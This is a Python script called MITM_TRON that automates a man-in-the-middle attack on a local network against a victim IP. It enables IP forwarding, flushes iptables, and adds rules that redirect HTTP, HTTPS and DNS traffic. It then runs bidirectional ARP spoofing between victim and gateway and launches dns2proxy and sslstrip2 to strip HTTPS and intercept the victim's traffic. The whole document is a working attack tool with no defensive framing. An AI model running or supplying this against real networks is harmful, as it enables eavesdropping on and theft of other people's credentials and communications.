###############################################################################################
#
#
# MITM_TRON
#
# Requires
#
# iptables
# arpspoof
# dns2proxy https://github.com/LeonardoNve/dns2proxy
# ssslstrip2 https://github.com/byt3bl33d3r/sslstrip2 (Original by Moxy MarlinSpike)
#
#
#
###############################################################################################


#!/usr/bin/python
import os
import datetime
import time
import subprocess
import sys
from subprocess import Popen, PIPE


def hello():
	print("Hello World!!!\nWelcome to MITM_TRON!!!")

def getIpAddresses():
	try:
		if (sys.argv[1] != None):
			victim_ip = sys.argv[1]
	except:
		print("please provide victim ip address")
		exit(-1)
	try:
		if (sys.argv[2] != None):
			gateway_ip = sys.argv[2]
	except:
		print("please provide gateway ip address")
		exit(-1)
	return victim_ip, gateway_ip

#Turn on IP forwarding
def ipFwd():
	print("Starting ip_fwd")
	os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
	print("Status of /proc/sys/net/ipv4/ip_forward:")
	os.system("cat /proc/sys/net/ipv4/ip_forward")


#Flush iptables
#flush iptables -t nat
def flushTables():
	print("Flushing iptables..")
	os.system("iptables --flush && iptables --flush -t nat")

#Establish traffic rerouting protocols
def reRoute():
	print("Rerouting...")
	os.system("iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 9000")
	os.system("iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 9000")
	os.system("iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-port 53")


#Bidirectional arpspoofing from victim to gateway and gateway to victim
#Opens separate windows. run CTRL+C co stop arpspoof and shut down window
#Arpspoof V-G
#Arpspoof G-V
def arpspoof(victim_ip, gateway_ip):
	print("starting bidirectional arpspoof...")
	os.system("lxterminal --tabs=arpspoof1 --working-directory=/home/pi/ -e 'arpspoof -i wlan0 -t %s %s'" % (victim_ip, gateway_ip))
	os.system("lxterminal --tabs=arpspoof2 --working-directory=/home/pi/ -e 'arpspoof -i wlan0 -t %s %s'" % (gateway_ip, victim_ip))


def startDnsProxy():
	print("starting dnsProxy...")
	os.system("lxterminal --tabs=dns2proxy --working-directory=/home/pi/dns2proxy-master/ -e 'python dns2proxy.py'")
	time.sleep(1)

def startSslStrip():
	print("starting sslStrip...")
	os.system("lxterminal --tabs=sslstrip --working-directory=/home/pi/sslstrip2-master/ -e 'sslstrip -l 9000 -a'")
	time.sleep(1)

###########################################################################################################

# Start it all up
if __name__ == '__main__':
	hello()
	victim_ip, gateway_ip = getIpAddresses()
	print("The victim's IP address is %s\nThe gateway's IP address is %s"\
		%(victim_ip, gateway_ip))
	time.sleep(3)
	ipFwd()
	flushTables()
	reRoute()
	arpspoof(victim_ip, gateway_ip)
	startDnsProxy()
	startSslStrip()
